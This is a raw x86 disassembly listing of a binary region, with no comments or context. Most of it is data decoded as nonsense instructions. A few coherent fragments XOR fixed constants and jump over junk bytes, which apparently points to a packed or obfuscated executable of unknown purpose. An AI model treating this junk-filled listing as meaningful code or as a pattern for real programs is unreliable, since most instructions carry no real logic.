  4108f8:	adc    BYTE PTR [ebx-0x6b],0xbf
  4108fc:	sahf   
  4108fd:	and    al,0xc9
  4108ff:	ss je  0x4108a0
  410902:	dec    edi
  410903:	push   0xffffffe4
  410905:	push   eax
  410906:	add    eax,DWORD PTR [ecx]
  410908:	jmp    0x8d1:0x5799d522
  41090f:	lods   al,BYTE PTR ds:[esi]
  410910:	sti    
  410911:	addr16 cs jb 0x4108a2
  410915:	adc    ebp,DWORD PTR [eax-0x439079f8]
  41091b:	sbb    BYTE PTR ds:0x66f189f0,bh
  410921:	sub    DWORD PTR [esi-0x4d86ffd9],esi
  410927:	cmp    eax,0x61d72abc
  41092c:	mov    al,0xdc
  41092e:	jl     0x410907
  410930:	jecxz  0x4109a9
  410932:	ror    edx,cl
  410934:	lods   eax,DWORD PTR ds:[esi]
  410935:	push   0x90dadda5
  41093a:	dec    edi
  41093b:	add    BYTE PTR [ebx-0x36],0x6f
  41093f:	enter  0x7798,0x86
  410943:	enter  0x6205,0xb1
  410947:	sar    BYTE PTR [edx],cl
  410949:	retf   
  41094a:	dec    edi
  41094b:	push   edx
  41094c:	clc    
  41094d:	push   ebp
  41094e:	dec    edi
  41094f:	(bad)  
  410950:	popa   
  410951:	mov    ch,0x4a
  410953:	stc    
  410954:	mov    ecx,DWORD PTR [ecx]
  410956:	enter  0x61f3,0x10
  41095a:	stc    
  41095b:	jb     0x410900
  41095d:	sti    
  41095e:	and    dh,bh
  410960:	jno    0x410923
  410962:	or     dl,cl
  410964:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410965:	shr    DWORD PTR [edi-0x28],0x5d
  410969:	sbb    eax,0x1e047596
  41096e:	jno    0x410939
  410970:	inc    esi
  410971:	xor    eax,0x61f380b0
  410976:	cwde   
  410977:	loop   0x4109b0
  410979:	out    0xc9,al
  41097b:	imul   edi,DWORD PTR [esp+esi*2-0x29],0xb12de65
  410983:	lock push edx
  410985:	(bad)  
  410986:	mov    ecx,0xe7a7c5d3
  41098b:	lock pop edi
  41098d:	adc    eax,0xa8fae981
  410992:	outs   dx,DWORD PTR ds:[esi]
  410993:	je     0x410933
  410995:	and    al,0xa1
  410997:	xchg   esp,eax
  410998:	bound  edx,QWORD PTR [ebx]
  41099a:	push   ecx
  41099b:	div    BYTE PTR [eax]
  41099d:	cs mov dh,0x89
  4109a0:	pop    edx
  4109a1:	inc    esp
  4109a2:	nop
  4109a3:	xor    dl,BYTE PTR [edx+0x511f4d02]
  4109a9:	fist   WORD PTR [ecx+eiz*4+0x3077657]
  4109b0:	mov    al,ds:0x80c1b199
  4109b5:	jp     0x41096c
  4109b7:	add    cl,BYTE PTR [ecx]
  4109b9:	data16 loop 0x41098e
  4109bc:	xchg   edi,eax
  4109bd:	dec    eax
  4109be:	ins    DWORD PTR es:[edi],dx
  4109bf:	rcl    BYTE PTR [ebx-0x2a22224c],cl
  4109c5:	push   es
  4109c6:	adc    eax,0x9f045ca5
  4109cb:	sar    DWORD PTR [ebx-0x200d71cc],0x87
  4109d2:	pop    esp
  4109d3:	dec    edx
  4109d4:	out    0x59,eax
  4109d6:	pop    ebp
  4109d7:	mov    al,ds:0x13f3c331
  4109dc:	sub    al,0x24
  4109de:	sbb    al,0xcc
  4109e0:	jb     0x4109cd
  4109e2:	push   ecx
  4109e3:	sub    DWORD PTR [ecx],ebp
  4109e5:	push   0xffffffe0
  4109e7:	fwait
  4109e8:	out    dx,al
  4109e9:	pop    di
  4109eb:	or     BYTE PTR [ebp+0x2],al
  4109ee:	mov    eax,ds:0xa7c478af
  4109f3:	call   0x464fdfca
  4109f8:	inc    eax
  4109f9:	inc    edi
  4109fa:	xchg   BYTE PTR [ebx+ebx*4+0x353d3bbb],ah
  410a01:	mov    bl,0x52
  410a03:	xchg   esi,eax
  410a04:	sbb    al,0xab
  410a06:	lahf   
  410a07:	aas    
  410a08:	pop    esi
  410a09:	mov    WORD PTR [ecx-0x70b6dba],fs
  410a0f:	je     0x4109dc
  410a11:	cmc    
  410a12:	inc    ebp
  410a13:	xchg   edx,eax
  410a14:	xor    DWORD PTR [esi-0x63757dee],0x77228583
  410a1e:	mov    cl,0x13
  410a20:	jp     0x410a9c
  410a22:	xor    bh,BYTE PTR cs:[edi+0x5473e01c]
  410a29:	jb     0x410a07
  410a2b:	push   ebx
  410a2c:	adc    DWORD PTR [ebx-0xb],ecx
  410a2f:	fstp   DWORD PTR [eax-0x6d94b5d2]
  410a35:	sub    al,0x95
  410a37:	retf   
  410a38:	sbb    al,0xea
  410a3a:	lods   al,BYTE PTR ds:[esi]
  410a3b:	mov    ch,0xfa
  410a3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a3e:	add    edx,esp
  410a40:	dec    esp
  410a41:	das    
  410a42:	hlt    
  410a43:	outs   dx,DWORD PTR ds:[esi]
  410a44:	in     eax,dx
  410a45:	adc    edx,DWORD PTR [ebx+0x74]
  410a48:	mov    dl,0xbc
  410a4a:	jmp    0x9037:0x2fdd885c
  410a51:	jno    0x410a1c
  410a53:	retf   0xbb5
  410a56:	aam    0xcd
  410a58:	pop    eax
  410a59:	add    BYTE PTR [ebx+ebp*1-0x57],bh
  410a5d:	arpl   di,si
  410a5f:	jnp    0x410a3d
  410a61:	jno    0x410ac0
  410a63:	mov    ebx,0xbd938d52
  410a68:	cmpxchg bh,dl
  410a6b:	pop    ds
  410a6c:	dec    eax
  410a6d:	in     al,0xa
  410a6f:	push   ebx
  410a70:	jl     0x410ae4
  410a72:	sub    DWORD PTR [ebx],edx
  410a74:	mov    DWORD PTR [esi+ebx*4],edx
  410a77:	mov    al,0x55
  410a79:	pop    ebx
  410a7a:	lea    ebp,[esi+0x3c]
  410a7d:	cmovae edi,DWORD PTR [ebx]
  410a80:	dec    ebx
  410a81:	pop    edi
  410a82:	ja     0x410a70
  410a84:	cmp    eax,0x51bb665c
  410a89:	xor    eax,0x2aa7f4b
  410a8e:	or     BYTE PTR [ecx+0xe9397cf],ch
  410a94:	add    BYTE PTR [edi],0x21
  410a97:	int3   
  410a98:	mov    al,ds:0xa457d3d3
  410a9d:	out    0xbd,eax
  410a9f:	int    0xe4
  410aa1:	xor    BYTE PTR fs:[ecx-0x6d],dl
  410aa5:	fs pop esp
  410aa7:	popf   
  410aa8:	pop    esi
  410aa9:	imul   eax,DWORD PTR [edi],0x305481b5
  410aaf:	and    edx,ecx
  410ab1:	sub    dl,al
  410ab3:	push   ebp
  410ab4:	aas    
  410ab5:	test   DWORD PTR [ecx+0x24],0xf05f4e06
  410abc:	adc    bl,bl
  410abe:	inc    edx
  410abf:	and    edx,ecx
  410ac1:	aam    0x66
  410ac3:	pop    ecx
  410ac4:	jbe    0x410b17
  410ac6:	pop    ss
  410ac7:	inc    eax
  410ac8:	shr    BYTE PTR [edi+0x16],0x1c
  410acc:	retf   
  410acd:	jo     0x410aad
  410acf:	pop    ebx
  410ad0:	xor    DWORD PTR [edx-0x44],ebp
  410ad3:	and    eax,0xd79780c0
  410ad8:	jg     0x410b00
  410ada:	sbb    DWORD PTR ds:0xabe98785,esi
  410ae0:	adc    ebp,ebp
  410ae2:	call   0x4e527b74
  410ae7:	fist   WORD PTR [edi+ecx*2+0x4e]
  410aeb:	aaa    
  410aec:	push   0x73
  410aee:	ret    
  410aef:	and    eax,0xd692212a
  410af4:	int    0x54
  410af6:	push   esi
  410af7:	mov    ch,BYTE PTR [ebp-0x7e]
  410afa:	fs aas 
  410afc:	mov    ecx,DWORD PTR [edx-0x40]
  410aff:	add    edx,ebx
  410b01:	add    eax,DWORD PTR [edi+0x4e]
  410b04:	es retf 
  410b06:	sbb    ch,BYTE PTR [eax]
  410b08:	sub    DWORD PTR [esi-0x401375ac],esi
  410b0e:	mov    ebp,edi
  410b10:	test   BYTE PTR [eax],dh
  410b12:	dec    esp
  410b14:	adc    eax,0x56384bc5
  410b19:	jae    0x410b92
  410b1b:	lods   eax,DWORD PTR ds:[esi]
  410b1c:	loopne 0x410acb
  410b1e:	dec    edi
  410b1f:	inc    eax
  410b20:	(bad)  
  410b21:	jmp    0x56923509
  410b26:	xchg   edx,eax
  410b27:	jmp    0xa868:0xc307c438
  410b2e:	pop    esp
  410b2f:	int3   
  410b30:	push   esi
  410b31:	cmp    edx,DWORD PTR [ecx]
  410b33:	push   eax
  410b35:	jbe    0x410b40
  410b37:	sub    esp,eax
  410b39:	cmp    eax,0x817ede48
  410b3e:	in     eax,0xda
  410b40:	nop
  410b41:	or     al,0xc1
  410b43:	gs in  eax,dx
  410b45:	ret    0x3c3d
  410b48:	sub    BYTE PTR [eax+0x5b],dl
  410b4b:	sub    eax,0x3ec75f77
  410b50:	sub    al,0x0
  410b52:	inc    eax
  410b53:	dec    ebp
  410b54:	dec    edi
  410b55:	sbb    BYTE PTR [ecx+0x187bf2e5],bl
  410b5b:	in     eax,0xd1
  410b5d:	push   cs
  410b5e:	fwait
  410b5f:	pushf  
  410b60:	jb     0x410b9b
  410b62:	inc    esi
  410b63:	push   esp
  410b64:	pop    esi
  410b65:	je     0x410b73
  410b6b:	mov    eax,DWORD PTR [ebp+0x8]
  410b6e:	jmp    0x410b8c
  410b73:	mov    eax,DWORD PTR [ebp-0x4]
  410b76:	xor    eax,edx
  410b78:	add    eax,ecx
  410b7a:	jmp    0x410b8c
  410b7f:	mov    eax,DWORD PTR [ebp-0x4]
  410b82:	xor    eax,0x7510855
  410b87:	add    eax,0x32729c
  410b8c:	leave  
  410b8d:	ret    0x4
  410b90:	push   ebp
  410b91:	mov    ebp,esp
  410b93:	jmp    0x410f98
  410b98:	outs   dx,DWORD PTR ds:[esi]
  410b99:	mov    WORD PTR ds:0x7191e994,cs
  410b9f:	jae    0x410bc2
  410ba1:	dec    esi
  410ba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ba3:	repz jecxz 0x410b85
  410ba6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ba7:	das    
  410ba8:	ds inc edx
  410baa:	jo     0x410c1c
  410bac:	pop    eax
  410bad:	jge    0x410c1f
  410baf:	jo     0x410b76
  410bb1:	fs jnp 0x410b62
  410bb4:	dec    edx
  410bb5:	retf   
  410bb6:	mov    ebx,0xfd263fef
  410bbb:	mov    eax,ds:0x676461ef
  410bc0:	je     0x410c38
  410bc2:	push   ds
  410bc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410bc4:	retf   0xe37f
  410bc7:	std    
  410bc8:	cmp    ebx,DWORD PTR [edx]
  410bca:	or     eax,0x70c2d27b
  410bcf:	les    esi,FWORD PTR [ebp+0x5859a005]
  410bd5:	(bad)  
  410bd8:	inc    ebp
  410bd9:	sbb    al,0xe1
  410bdb:	cmp    BYTE PTR [ecx-0x11],0x89
  410bdf:	shl    BYTE PTR [ecx-0x79],1
  410be2:	push   eax
  410be3:	in     al,0x92
  410be5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410be6:	pop    edi
  410be7:	retf   0xe24b
  410bea:	fidivr WORD PTR [edx]
  410bec:	mov    bh,0xb
  410bee:	cmp    dl,BYTE PTR [edi]
  410bf0:	sbb    eax,DWORD PTR [edi]
  410bf2:	ins    BYTE PTR es:[edi],dx
  410bf3:	pop    ebx
  410bf4:	fist   DWORD PTR [edi-0x3f]
  410bf7:	mov    ds:0x2f3ac8e1,al
  410bfc:	adc    cl,BYTE PTR [edx+0x5b3c8671]
  410c02:	das    
  410c03:	cmc    
  410c04:	loop   0x410bf5
  410c06:	ss adc eax,0x688c85f2
  410c0c:	ja     0x410c0c
  410c0e:	out    0xb7,al
  410c10:	jae    0x410c4a
  410c12:	add    edi,esp
  410c14:	sbb    ah,dl
  410c16:	xchg   edx,eax
  410c17:	mov    ch,0xf3
  410c19:	mov    al,0xd4
  410c1b:	mov    al,ds:0x300500d0
  410c20:	mov    al,0x51
  410c22:	sbb    BYTE PTR [ebp-0x757647e3],al
  410c28:	fcmovnb st,st(2)
  410c2a:	aad    0xc
  410c2c:	pop    esp
  410c2d:	shl    BYTE PTR [eax],1
  410c2f:	gs pop es
  410c31:	stc    
  410c32:	cmp    ch,BYTE PTR [ebx]
  410c34:	pop    ebx
  410c35:	pop    es
  410c36:	inc    ebp
  410c37:	jp     0x410cb0
  410c39:	into   
  410c3a:	gs into 
  410c3c:	repz or si,sp
  410c40:	push   cs
  410c41:	mov    ah,0xfe
  410c43:	aaa    
  410c44:	cld    
  410c45:	fild   WORD PTR [ebp-0x7ba3238e]
  410c4b:	mov    ecx,0x3be49ef8
  410c50:	xchg   DWORD PTR [esi+ebx*4+0x2df5818e],ebx
  410c57:	test   DWORD PTR [eax+0x55],edx
  410c5a:	bound  ebp,QWORD PTR [ebx]
  410c5c:	dec    ebp
  410c5d:	xor    al,0x23
  410c5f:	shl    al,cl
  410c61:	cmp    al,0x6a
  410c63:	or     DWORD PTR [ebp+0x56],edx
  410c66:	or     esp,esi
  410c68:	retf   
  410c69:	jnp    0x410c6c
  410c6b:	xchg   ecx,eax
  410c6c:	aad    0x4e
  410c6e:	push   0xcc0466a8
  410c73:	pop    DWORD PTR ds:0x399ce87d
  410c79:	scas   eax,DWORD PTR es:[edi]
  410c7a:	out    0x14,eax
  410c7c:	jl     0x410cf2
  410c7e:	add    DWORD PTR [esp+esi*1+0x37],ecx
  410c82:	mov    al,ah
  410c84:	and    ch,BYTE PTR [ecx+eiz*4]
  410c87:	jne    0x410c19
  410c89:	pushw  0xb
  410c8c:	stos   DWORD PTR es:[edi],eax
  410c8d:	pop    eax
  410c8e:	scas   al,BYTE PTR es:[edi]
  410c8f:	mov    dh,0x31
  410c91:	jns    0x410c6c
  410c93:	cmp    bl,BYTE PTR [eax+ebx*2]
  410c96:	cmc    
  410c97:	mov    esi,edx
  410c99:	push   ecx
  410c9a:	and    eax,0xb359c1d6
  410c9f:	arpl   WORD PTR [edx-0x74],bx
  410ca2:	mov    al,0x6c
  410ca4:	aas    
  410ca5:	sub    ah,0xb9
  410ca8:	add    BYTE PTR [ebp-0x10],bl
  410cab:	push   ds
  410cac:	xchg   esp,eax
  410cad:	add    al,0x23
  410caf:	xchg   ebx,eax
  410cb0:	adc    al,0x5a
  410cb2:	inc    ebx
  410cb3:	cmp    BYTE PTR [eax+0x4e29d4fe],cl
  410cb9:	sbb    ecx,DWORD PTR [edi+0x71]
  410cbc:	and    dh,ch
  410cbe:	inc    ecx
  410cbf:	stc    
  410cc0:	test   DWORD PTR [esi+0x52e472d7],ebp
  410cc6:	mov    eax,ds:0x5a66067b
  410ccb:	leave  
  410ccc:	outs   dx,BYTE PTR ds:[esi]
  410ccd:	add    DWORD PTR [esi],eax
  410ccf:	cmp    eax,0x47c26510
  410cd4:	repnz hlt 
  410cd6:	stc    
  410cd7:	pop    edi
  410cd8:	pop    edx
  410cd9:	sbb    BYTE PTR [esi],0x96
  410cdc:	adc    ebp,ebp
  410cde:	in     al,0x18
  410ce0:	das    
  410ce1:	in     al,0x7
  410ce3:	ins    DWORD PTR es:[edi],dx
  410ce4:	std    
  410ce5:	and    ecx,DWORD PTR [ebp-0x508cf9bc]
  410ceb:	cmp    bl,BYTE PTR [ebp+0x7d]
  410cee:	jecxz  0x410d6d
  410cf0:	repz push ds
  410cf2:	popf   
  410cf3:	je     0x410cc9
  410cf5:	or     al,bh
  410cf7:	(bad)  
  410cf9:	jbe    0x410c8e
  410cfb:	outs   dx,DWORD PTR ds:[esi]
  410cfc:	dec    cl
  410cfe:	popf   
  410cff:	xchg   esp,eax
  410d00:	adc    BYTE PTR [ebx-0x3b],cl
  410d03:	(bad)  [ecx+0x5b75882e]
  410d09:	mov    eax,ds:0x9c3dbea6
  410d0e:	ret    
  410d0f:	cmp    DWORD PTR [eax-0x7fe5b999],esi
  410d15:	mov    bh,0x64
  410d17:	clc    
  410d18:	jl     0x410d3f
  410d1a:	test   ebp,edx
  410d1c:	push   cs
  410d1d:	aad    0x74
  410d1f:	xchg   BYTE PTR [edx+0x2074a16d],cl
  410d25:	push   ebx
  410d26:	mov    esi,DWORD PTR [ecx+eax*2-0x1c]
  410d2a:	sub    eax,0x9d695eb6
  410d2f:	pop    ecx
  410d30:	(bad)  
  410d31:	(bad)  
  410d32:	inc    ebx
  410d33:	add    eax,0xed8bfb44
  410d38:	(bad)  
  410d39:	call   0x14d26cce
  410d3e:	pop    esi
  410d3f:	or     BYTE PTR [edx+0x5661f6d4],ah
  410d45:	ds adc ebx,edx
  410d48:	jno    0x410ccd
  410d4a:	push   edx
  410d4b:	addr16 leave 
  410d4d:	push   ds
  410d4e:	arpl   WORD PTR [eax-0x72],ax
  410d51:	mov    dh,0x72
  410d53:	aas    
  410d54:	pop    edi
  410d55:	jp     0x410d33
  410d57:	add    al,BYTE PTR [ebx-0x666f0b6]
  410d5d:	aad    0x58
  410d5f:	xor    ah,BYTE PTR [esi]
  410d61:	ror    ebp,cl
  410d63:	in     al,dx
  410d64:	sub    bh,BYTE PTR [ecx+0x14]
  410d67:	add    esi,DWORD PTR fs:[ebx]
  410d6a:	xchg   edi,eax
  410d6b:	lea    ebx,[edi-0x5621ebfe]
  410d71:	in     eax,dx
  410d72:	push   ebx
  410d73:	iret   
  410d74:	mov    al,0xb4
  410d77:	fcom   DWORD PTR [esi-0x54]
  410d7a:	push   esp
  410d7b:	stos   DWORD PTR es:[edi],eax
  410d7c:	jmp    0x6c389bea
  410d81:	(bad)  
  410d82:	jmp    0xf05c:0xeb089267
  410d89:	inc    esp
  410d8a:	shr    DWORD PTR [ebx-0x4d],cl
  410d8d:	(bad)  
  410d8e:	ficomp WORD PTR [edx+0x48]
  410d91:	xor    eax,DWORD PTR [ecx+0x2d2e7da0]
  410d97:	cld    
  410d98:	out    0x74,al
  410d9a:	stc    
  410d9b:	jnp    0x410df8
  410d9d:	frstor [esi]
  410d9f:	mov    bh,0xcb
  410da1:	popf   
  410da2:	iret   
  410da3:	nop
  410da4:	arpl   WORD PTR [eax-0x61cd4fae],cx
  410daa:	popf   
  410dab:	pop    ebx
  410dac:	call   0xe9468d62
  410db1:	and    DWORD PTR [ebp+0x3c],ebx
  410db4:	in     eax,0x95
  410db6:	in     al,dx
  410db7:	lds    ebx,FWORD PTR [esi-0x54baa4d9]
  410dbd:	test   eax,0x167826ed
  410dc2:	add    bh,cl
  410dc4:	pop    ds
  410dc5:	sub    ch,BYTE PTR [ecx]
  410dc7:	sti    
  410dc8:	test   al,0x9f
  410dca:	out    dx,eax
  410dcb:	xor    al,0x67
  410dcd:	pop    edx
  410dce:	push   es
  410dcf:	jmp    0x410e05
  410dd1:	mov    eax,0x7d0dacdf
  410dd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410dd7:	nop
  410dd8:	outs   dx,BYTE PTR ds:[esi]
  410dd9:	inc    edi
  410dda:	push   ecx
  410ddb:	cld    
  410ddc:	in     al,0xf3
  410dde:	inc    ebp
  410ddf:	inc    edx
  410de0:	mov    cl,0xbd
  410de2:	popf   
  410de3:	(bad)  
  410de4:	out    0x14,al
  410de6:	ss loope 0x410e3a
  410de9:	cmp    eax,0x57a3ede0
  410dee:	shl    edx,cl
  410df0:	cwde   
  410df1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410df2:	mov    edi,0xf44f643d
  410df7:	addr16 pop ebx
  410df9:	pop    ecx
  410dfa:	jmp    0x410dad
  410dfc:	dec    ebp
  410dfd:	leave  
  410dfe:	sub    ch,dl
  410e00:	xor    esp,eax
  410e02:	cli    
  410e03:	sbb    eax,0xca14437c
  410e08:	push   eax
  410e09:	xor    al,0x81
  410e0b:	xor    eax,0xfa0486
  410e10:	inc    ecx
  410e11:	xchg   ebx,eax
  410e12:	iret   
  410e13:	or     esi,DWORD PTR [ecx+eiz*2]
  410e16:	or     ebp,esi
  410e18:	xchg   DWORD PTR [ebx+ecx*4-0x1b],ebp
  410e1c:	bound  ebx,QWORD PTR [edx+0x7275d6af]
  410e22:	(bad)  
  410e23:	cmp    al,0x8c
  410e25:	xchg   ecx,eax
  410e26:	stc    
  410e27:	repnz or BYTE PTR [edx],0xd8
  410e2b:	inc    esp
  410e2c:	mov    ah,BYTE PTR [ebp+0x4a223ea4]
  410e32:	ficomp WORD PTR [edi-0x74]
  410e35:	sub    DWORD PTR [ecx],eax
  410e37:	stc    
  410e38:	add    BYTE PTR [eax+0x34],ah
  410e3b:	push   es
  410e3c:	lds    esi,FWORD PTR [eax-0x55]
  410e3f:	or     esi,ecx
  410e41:	rcr    BYTE PTR [ebx],1
  410e43:	retf   
  410e44:	push   ebx
  410e45:	push   edx
  410e46:	sbb    al,0x51
  410e48:	push   ebp
  410e49:	xchg   DWORD PTR [edx+ebx*4+0x1b],ecx
  410e4d:	fstp   DWORD PTR [ebp-0x23]
  410e50:	or     al,0xb3
  410e52:	dec    edi
  410e53:	in     al,0xf7
  410e55:	and    DWORD PTR [ebp-0x1bb05e80],eax
  410e5b:	jge    0x410de4
  410e5d:	leave  
  410e5e:	mov    ecx,0x6f2428b8
  410e63:	repz sub bh,ah
  410e66:	rol    DWORD PTR [ebx-0x2f],0x96
  410e6a:	mov    edi,0xc8e78f58
  410e6f:	xor    cl,BYTE PTR [edx-0x3090fab9]
  410e75:	sbb    ch,BYTE PTR ds:0x65e249fb
  410e7b:	push   ebp
  410e7c:	js     0x410ebe
  410e7e:	cli    
  410e7f:	loop   0x410e57
  410e81:	not    BYTE PTR [edx-0x7823680f]
  410e87:	out    0xb6,eax
  410e89:	mov    BYTE PTR [edi],ch
  410e8b:	inc    edi
  410e8c:	fcmovu st,st(1)
  410e8e:	int3   
  410e8f:	in     eax,0xf1
  410e91:	push   es
  410e92:	(bad)  
  410e93:	clc    
  410e94:	bound  ebx,QWORD PTR [esi-0x2b]
  410e97:	jo     0x410e60
  410e99:	push   ss
  410e9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e9b:	stos   DWORD PTR es:[edi],eax
  410e9c:	(bad)  
  410e9d:	mov    dh,0xd5
  410e9f:	adc    edx,esi
  410ea1:	hlt    
  410ea2:	fwait
  410ea3:	or     eax,0x8513a890
  410ea8:	repz div BYTE PTR [ebx-0x48747fc0]
  410eaf:	inc    esi
  410eb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410eb1:	or     esp,DWORD PTR [esp+esi*1]
  410eb4:	stc    
  410eb5:	xor    BYTE PTR [ebx],ch
  410eb7:	ret    
  410eb8:	shr    edx,1
  410eba:	push   cs
  410ebb:	mov    ch,0xb0
  410ebd:	sub    edi,DWORD PTR [ecx+0x3e]
  410ec0:	jae    0x410e80
  410ec2:	pop    eax
  410ec3:	ror    cl,1
  410ec5:	sub    eax,0x38a6237c
  410eca:	add    eax,0x97aae6ff
  410ecf:	cmp    cl,0xe
  410ed2:	mov    ecx,DWORD PTR [ecx-0x6c]
  410ed5:	or     BYTE PTR [ecx],al
  410ed7:	mov    esp,0x9202cabf
  410edc:	call   0x1ad4e43a
  410ee1:	fwait
  410ee2:	ins    BYTE PTR es:[edi],dx
  410ee3:	add    al,0xae
  410ee5:	rcr    DWORD PTR [ebx+0x25],cl
  410ee8:	push   ds
  410ee9:	(bad)  
  410eeb:	xor    al,0x8e
  410eed:	mov    esi,0x4b3e7c7b
  410ef2:	lea    ebx,[edx-0x42]
  410ef5:	push   ss
  410ef6:	in     eax,dx
  410ef7:	add    BYTE PTR [esi+0x3a],al
  410efa:	mov    bl,0xad
  410efc:	jno    0x410f07
  410efe:	scas   eax,DWORD PTR es:[edi]
  410eff:	leave  
  410f00:	cs xabort 0x30
  410f04:	xor    al,0xba
  410f06:	push   esp
  410f07:	add    DWORD PTR [ebx+edx*4],0xffffffd4
  410f0b:	ret    0xab0e
  410f0e:	(bad)  
  410f10:	dec    eax
  410f11:	jbe    0x410f22
  410f13:	mov    dh,0x64
  410f15:	inc    esi
  410f16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f17:	mov    eax,0x1bcb3aa5
  410f1c:	mov    ds:0x86c37314,al
  410f21:	mov    esp,0x6cf3f168
  410f26:	fcom   QWORD PTR [edi+edi*2-0x6787076c]
  410f2d:	stos   DWORD PTR es:[edi],eax
  410f2e:	add    esi,edi
  410f30:	cmp    al,0x93
  410f32:	xchg   edi,eax
  410f33:	sbb    eax,0x528ce96c
  410f38:	js     0x410f5b
  410f3a:	xor    dh,ah
  410f3c:	mov    dl,al
  410f3e:	inc    esi
  410f3f:	(bad)  
  410f40:	and    eax,0x6c43908
  410f45:	jbe    0x410f9b
  410f47:	mov    al,ds:0xeca520d2
  410f4c:	cmp    ch,BYTE PTR [edx-0x79]
  410f4f:	mov    al,0xe9
  410f51:	pop    eax
  410f52:	cmc    
  410f53:	fld    DWORD PTR cs:[ebp+0xf]
  410f57:	fnstcw WORD PTR [ebx]
  410f59:	dec    esi
  410f5a:	ds inc esi
  410f5c:	xchg   edi,eax
  410f5d:	lea    edx,[edi+ebx*8-0x6e]
  410f61:	cmp    al,BYTE PTR ds:0x12a545c5
  410f67:	inc    esi
  410f68:	cdq    
  410f69:	cmp    al,BYTE PTR [ebx+0x7b68fb13]
  410f6f:	push   esp
  410f70:	push   0xfad8f70e
  410f75:	adc    al,0xb1
  410f77:	mov    al,ds:0x5788e926
  410f7c:	lahf   
  410f7d:	sub    ch,BYTE PTR [ebp+0x41]
  410f80:	push   0xa2bdd242
  410f85:	mov    ebx,0x91a732c
  410f8a:	cmc    
  410f8b:	push   ss
  410f8c:	ins    DWORD PTR es:[edi],dx
  410f8d:	push   0x15
  410f8f:	arpl   WORD PTR [ecx+0x1a8f5284],bp
  410f95:	sub    esp,DWORD PTR [eax+edx*8]
  410f98:	mov    eax,ds:0x41b22c
  410f9d:	mov    edx,0x32729c
  410fa2:	sub    eax,edx
  410fa4:	adc    DWORD PTR ds:0x42fd6e,ebx
  410faa:	mov    ecx,0x7510855
  410faf:	push   esi
  410fb0:	mov    esi,DWORD PTR [ebp+0xc]
  410fb3:	xor    eax,ecx
  410fb5:	mov    DWORD PTR ds:0x42e11c,0x4b31
  410fbf:	jmp    0x4113c4
  410fc4:	xchg   edx,eax
  410fc5:	shl    DWORD PTR [edi+eiz*8+0x71516771],cl
  410fcc:	push   ebp
  410fcd:	paddsw mm6,QWORD PTR [eax+0x3cf375e7]
  410fd4:	es dec esi
  410fd6:	jo     0x411048
  410fd8:	pop    eax
  410fd9:	jge    0x41104b
  410fdb:	jo     0x410fd9
  410fdd:	dec    edi
  410fde:	dec    esp
  410fdf:	fcomp  QWORD PTR [bp+si-0x19]
  410fe3:	(bad)  
  410fe4:	je     0x411047
  410fe6:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  410fe8:	rcr    BYTE PTR [edx-0x52],0x10
  410fec:	and    BYTE PTR [eax],dh
  410fee:	in     eax,dx
  410fef:	stos   DWORD PTR es:[edi],eax
  410ff0:	mov    BYTE PTR [edx],0xdd
  410ff3:	sahf   
  410ff4:	lods   eax,DWORD PTR ds:[esi]
  410ff5:	fbstp  TBYTE PTR [edx-0x7983366c]
  410ffb:	test   ecx,0x240cd5e4
  411001:	mov    esp,0x4a533aa5
  411006:	lds    eax,FWORD PTR [edi-0x55]
  411009:	pop    edi
  41100a:	inc    edx
  41100b:	or     esi,DWORD PTR [ebx-0x51]
  41100e:	out    0x81,eax
  411010:	jnp    0x41104e
  411012:	ds and al,0x49
  411015:	jae    0x410ffe
  411017:	pop    edi
  411018:	mov    dh,0xbd
  41101a:	sbb    BYTE PTR [edi+0x7b],ah
  41101d:	lods   al,BYTE PTR ds:[esi]
  41101e:	ss mov edx,0xb2235dcd
  411024:	aam    0x64
  411026:	sbb    dl,bh
  411028:	adc    edi,DWORD PTR [ebx]
  41102a:	std    
  41102b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41102c:	cmp    edi,DWORD PTR [ecx-0x39893363]
  411032:	sbb    al,0xa9
  411034:	mov    dh,0x57
  411036:	push   ebx
  411037:	(bad)  
  411038:	pop    ebx
  411039:	xor    esp,DWORD PTR [edi]
  41103b:	adc    edi,DWORD PTR [esi-0x29]
  41103e:	sub    dh,ch
  411040:	push   esp
  411041:	rcr    ah,1
  411043:	cmp    cl,ah
  411045:	bound  edx,QWORD PTR fs:[ebp+0x797b6e15]
  41104c:	ret    0xf9eb
  41104f:	repz jmp 0x411072
  411052:	xchg   edx,eax
  411053:	test   DWORD PTR [ebx+0x77900f16],esp
  411059:	sub    al,0x70
  41105b:	ss into 
  41105d:	hlt    
  41105e:	xchg   ecx,eax
  41105f:	popa   
  411060:	adc    ch,BYTE PTR [edx]
  411062:	hlt    
  411063:	xchg   esi,eax
  411064:	in     eax,dx
  411065:	adc    al,0x9f
  411067:	pusha  
  411068:	xchg   ecx,eax
  411069:	repnz inc ebx
  41106b:	sub    eax,0x66532160
  411070:	jns    0x411083
  411072:	dec    esp
  411073:	icebp  
  411074:	push   es
  411075:	xor    edx,esp
  411077:	and    DWORD PTR [esi-0x2ea22d1e],ebp
  41107d:	daa    
  41107e:	inc    eax
  41107f:	(bad)
  411082:	mov    dl,0x7f
  411084:	mov    edi,0xaa952b33
  411089:	sub    ah,bh
  41108b:	cmp    BYTE PTR [ebp+0x14a4490d],ch
  411091:	fidivr DWORD PTR [esp+eax*2+0x4a168f62]
  411098:	dec    si
  41109a:	dec    edi
  41109b:	aaa    
  41109c:	addr16 mov dl,0xb9
  41109f:	inc    edi
  4110a0:	cmp    ah,BYTE PTR [ebp-0x1d]
  4110a3:	jmp    0x4110c1
  4110a5:	mov    bl,0x6f
  4110a7:	test   eax,0xc4aa298d
  4110ac:	imul   DWORD PTR [edi-0x48]
  4110af:	adc    DWORD PTR [edi+0x6101c05d],edi
  4110b5:	mov    al,0xfa
